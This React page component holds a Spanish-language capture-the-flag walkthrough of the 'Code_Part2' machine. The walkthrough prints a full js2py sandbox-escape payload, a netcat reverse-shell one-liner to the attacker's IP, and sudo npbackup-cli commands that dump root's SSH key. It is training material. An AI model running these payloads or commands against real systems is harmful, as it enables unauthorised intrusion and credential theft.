import React from "react";
import { useImageLightbox } from "@/components/ImageLightbox";

export default function Code_Part2() {
  const { LightboxImage, LightboxOverlay } = useImageLightbox();
  return (
    <>
      <LightboxOverlay />
      <article className="prose prose-invert">
      <br />
      <LightboxImage src="/images/Blog/Miniaturas/code_part2.png" alt="Cap machine thumbnail" className="mx-auto" />
      <br />
      <p><strong>Descripción:</strong> Code_Part2 es una máquina Linux de dificultad fácil centrada en una vulnerabilidad
        de ejecución remota derivada de una librería vulnerable, descargar el código de la aplicación, extraer credenciales 
        desde una base de datos disponible y abusar de un binario con privilegios <code>sudo</code>.</p>
      <br />

      <strong>Reconocimiento</strong>
      <p>Comenzamos con un escaneo inicial de puertos usando <code>nmap</code>:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p- -n -Pn --open -sS --min-rate 2000 {IP}`}</pre>
      <br />
      <p>Parámetros:</p>
      <ul>
        <li><code>-p-</code> escanea todos los puertos</li>
        <li><code>-n</code> evita resolución DNS</li>
        <li><code>-Pn</code> no realiza descubrimiento de hosts</li>
        <li><code>--open</code> muestra solo puertos abiertos</li>
        <li><code>-sS</code> SYN stealth scan</li>
        <li><code>--min-rate 2000</code> velocidad mínima de paquetes</li>
      </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Codepart2_HTB/Enumeracion/enumeracion_nmap1.png" alt="nmap first scan" className="mx-auto" />
      <br />

      <p>Se detectaron puertos abiertos. Realizamos un escaneo más detallado:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p22,8000 -n -Pn -sCV {IP}`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/Codepart2_HTB/Enumeracion/enumeracion_nmap2.png" alt="nmap second scan" className="mx-auto" />
      <br />

      <p>Vemos las versiones de los servicios SSH y HTTP, así como la tecnología que se ejecuta en el servidor web.</p>
      <br />

      <h2>Análisis del Servicio Web</h2>
      <p>Al acceder al servicio web nos encontramos con un panel de autenticación donde, entre otras opciones, podemos
        registrarnos y descargar el código de la aplicación.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/Codepart2_HTB/Enumeracion/enumeracion_app1.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Al descargar e inspeccionar el código fuente, observamos que en el <code>requirements.txt</code> hay una librería
        en una versión vulnerable: <code>js2py==0.74</code>.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/Codepart2_HTB/Enumeracion/enumeracion_app.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Al registrarnos e iniciar sesión en la aplicación observamos que el servidor interpreta código JavaScript.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/Codepart2_HTB/Explotacion/explotacion_dashboard_1.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Con el siguiente comando comprobamos que podemos comunicarnos desde el servidor hacia nuestra máquina local: montamos
        un servidor HTTP local y hacemos una petición desde el servidor vulnerable hacia nuestra máquina.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`python -m http.server`}</pre>
      <br />
      <p>En este enlace está la prueba de concepto (POC):
        <a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py" target="_blank" rel="noopener noreferrer" className="text-blue-500 hover:text-blue-400 underline">https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py</a>
        , que muestra cómo ejecutar código aprovechando la versión vulnerable de <code>js2py</code>.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`payload = """
        // [+] command goes here:
        let cmd = "curl http://Nuestra_IP:8000; "
        let hacked, bymarve, n11
        let getattr, obj

        hacked = Object.getOwnPropertyNames({})
        bymarve = hacked.__getattribute__
        n11 = bymarve("__getattribute__")
        obj = n11("__class__").__base__
        getattr = obj.__getattribute__

        function findpopen(o) {
            let result;
            for(let i in o.__subclasses__()) {
                let item = o.__subclasses__()[i]
                if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
                    return item
                }
                if(item.__name__ != "type" && (result = findpopen(item))) {
                    return result
                }
            }
        }

        n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
        console.log(n11)
        n11
        """`}</pre>
      <br />
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Explotacion/explotacion_dashboard_2.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Y efectivamente vemos que recibimos la petición por parte del servidor, entonces ahora lo siguiente es lanzar una reverse shell. Por lo que nos 
        ponemos en escucha desde nuestra máquina local con el comando <code>penelope.py</code>. Dejo enlace a la herramienta que es super útil.</p>
        <a href="https://github.com/brightio/penelope" target="_blank" rel="noopener noreferrer" className="text-blue-500 hover:text-blue-400 underline"> 
       Penelope repositorio </a>
      <br />
      <p>Buscamos una reverse shell en <a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer" className="text-blue-500 hover:text-blue-400 underline">https://www.revshells.com/</a>. Ejemplo:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc Nuestra_IP 4444 >/tmp/f`}</pre>
      <br />
      <p>Del POC anterior solo modificamos el comando <code>curl</code> por la reverse shell:</p>
      <br />
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Explotacion/explotacion_dashboard_3.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Recibimos la reverse shell en nuestra máquina local y obtenemos acceso al sistema. Estamos como el usuario <code>app</code>.
        En el directorio de trabajo de <code>app</code> encontramos un archivo <code>users.db</code> en <code>/home/app/instance/</code>.</p>
      <br />
      <p>Dicho archivo podemos abrir con la herramienta <code>sqlite3 users.db</code>.</p>
      <br />
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Explotacion/explotacion_dashboard_4.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>En la base de datos vemos las credenciales de los usuarios <code>marco</code> y <code>app</code>; están cifradas, por lo que
        las copiamos e intentamos crackearlas.</p>
      <br />
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Explotacion/explotacion_marco_1.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Obtenemos las credenciales del usuario <code>marco</code>: <code>marco:sweetangelbabylove</code>, con las que iniciamos sesión como
        <code>marco</code>.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`su marco`}</pre>
      <br />      
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_1.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Con esto obtenemos la primera flag del reto, ubicada en el directorio del usuario <code>marco</code> en el archivo <code>user.txt</code>.</p>
      <br />
      <p>Ahora queda escalar privilegios. Ejecutamos <code>sudo -l</code> para ver privilegios disponibles.</p>
      <br />
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_2.png" alt="web enumeration" className="mx-auto" />
      <br />  
      <p>Vemos que podemos ejecutar <code>/usr/local/bin/npbackup-cli</code> como root sin contraseña.</p>
      <p>En el directorio personal de <code>marco</code> hay un archivo de configuración llamado <code>npbackup.conf</code>. Analizando su contenido
        observamos que realiza backups por defecto a <code>/home/app/app</code>. Este archivo de configuración es necesario para ejecutar
        <code>npbackup-cli</code>.</p>
      <br />  
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_3.png" alt="web enumeration" className="mx-auto" />
      <br />  
      <p>Copiamos <code>npbackup.conf</code> a un directorio temporal.</p>
      <br />  
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_4.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Modificamos la ruta en la configuración para indicar una ubicación que nos interese respaldar.</p>
      <br />  
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_5.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Ejecutamos <code>/usr/local/bin/npbackup-cli</code> con el archivo <code>npbackup.conf</code> modificado.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -b -f`}</pre>
      <br />  
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_6.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Listado de los snapshots generados; vemos el que acabamos de crear.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -s`}</pre>
      <br />  
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_7.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Listamos los archivos del snapshot indicando su correspondiente ID.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf --ls ID`}</pre>
      <br />  
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_8.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Vemos los archivos del directorio <code>/root/</code>. A continuación volcamos la clave privada de root para usarla posteriormente
        y acceder por SSH como root.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf --snapshot-id ID --dump /root/.ssh/id_rsa`}</pre>
      <br />  
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_9.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Copiamos la clave privada de root a nuestro sistema local.</p>
      <br />  
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_10.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Cambiamos los permisos de la clave privada para poder utilizarla.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`chmod 600 /tmp/id_rsa`}</pre>
      <br />
      <p>Accedemos por SSH como root usando la clave privada copiada.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`ssh root@IP_Victima -i /tmp/id_rsa`}</pre>
      <br />
      <img src="/images/Blog/Máquinas/Codepart2_HTB/Escalada/escalada_marco_11.png" alt="web enumeration" className="mx-auto" />
      <br />
      <p>Por último, leemos la flag de root.</p>
      <br />
      <p>Code_Part2 demuestra la importancia de mantener dependencias actualizadas y no usar versiones vulnerables,
      validar correctamente cualquier sandbox o intérprete de código, proteger ficheros de configuración y backups que
      puedan exponer información sensible, y restringir el uso de binarios con <code>sudo</code> para evitar escaladas de
      privilegio. Una mala configuración en cualquiera de estos aspectos puede derivar en compromiso total del servidor.</p>
    </article>
    </>
  );
}
